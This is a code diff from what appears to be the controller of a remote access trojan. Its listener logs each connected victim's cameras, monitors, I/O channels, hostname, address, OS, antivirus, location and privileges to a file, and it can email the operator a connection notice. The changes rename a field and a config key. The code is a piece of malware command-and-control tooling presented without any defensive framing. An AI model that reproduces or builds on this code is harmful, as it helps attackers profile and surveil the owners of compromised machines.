@@ -69,19 +69,19 @@ def listening(host, port, stdout=True):
           make_directories([data['username']])
           with open(f'{state["root"]}/{data["username"]}/whoami.txt', 'a') as f:
             title = f'Whoami at {get_timestamp()}'
-            text = f'Monitors: {data["monitors"]}\nCams: {data["cams"]}\nMicrophone: {data["microphone"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}'
+            text = f'Monitors: {data["monitors"]}\nCams: {data["cams"]}\nI/O Channels: {data["io-channels"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}'
             f.write(f'{title}\n{text}\n{"-" * len(title)}\n')
 
         for index, item in enumerate(state['sockets']['clients']):
           item.append(data_list[index])
 
-        if state['options']['notices']['email-notice']:
+        if state['options']['notice']['email-notice']:
           send_email(
-                    state['options']['notices']['email-data']['email'],
-                    state['options']['notices']['email-data']['password'],
-                    state['options']['notices']['email-data']['to'],
+                    state['options']['notice']['email-data']['email'],
+                    state['options']['notice']['email-data']['password'],
+                    state['options']['notice']['email-data']['to'],
                     'Connection Notice!',
-                    f'Connection at {get_timestamp()}\nMonitors: {data["monitors"]}\nCams: {data["cams"]}\nMicrophone: {data["microphone"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}')
+                    f'Connection at {get_timestamp()}\nMonitors: {data["monitors"]}\nCams: {data["cams"]}\nI/O Channels: {data["io-channels"]}\nUsername@Hostname: {data["username"]}\nAddress: {data["address"]}\nOperating System: {data["os"]}\nAntivirus: {data["antivirus"]}\nLocation: {data["location"]}\nPrivileges: {data["privileges"]}')
       else:
         client.close()
     except Exception as err:
